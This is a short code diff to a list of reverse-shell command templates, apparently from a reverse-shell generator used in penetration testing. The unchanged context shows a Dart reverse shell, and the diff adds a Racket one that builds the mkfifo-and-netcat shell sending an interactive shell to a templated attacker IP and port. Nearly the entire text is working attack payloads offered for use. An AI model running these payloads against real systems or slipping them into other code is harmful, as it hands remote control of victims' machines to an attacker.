@@ -282,6 +282,11 @@ const reverseShellCommands = withCommandType(
             "name": "Dart",
             "command": "import 'dart:io';\nimport 'dart:convert';\n\nmain() {\n  Socket.connect(\"{ip}\", {port}).then((socket) {\n    socket.listen((data) {\n      Process.start('{shell}', []).then((Process process) {\n        process.stdin.writeln(new String.fromCharCodes(data).trim());\n        process.stdout\n          .transform(utf8.decoder)\n          .listen((output) { socket.write(output); });\n      });\n    },\n    onDone: () {\n      socket.destroy();\n    });\n  });\n}",
             "meta": ["linux", "mac", "windows"]
+        },
+        {
+            "name": "Racket",
+            "command": "#lang racket\n(require racket/system)\n\n(define ip-addr\n  \"{ip}\")\n(define port\n  {port})\n\n(system\n (string-join (list \"rm /tmp/f;\"\n                    \"mkfifo /tmp/f;\"\n                    \"cat /tmp/f | {shell} -i 2>&1 | nc\"\n                    ip-addr\n                    (number->string port)\n                    \">/tmp/f\")\n              \" \"))",
+            "meta": ["linux", "mac"]
         }
     ]
 );
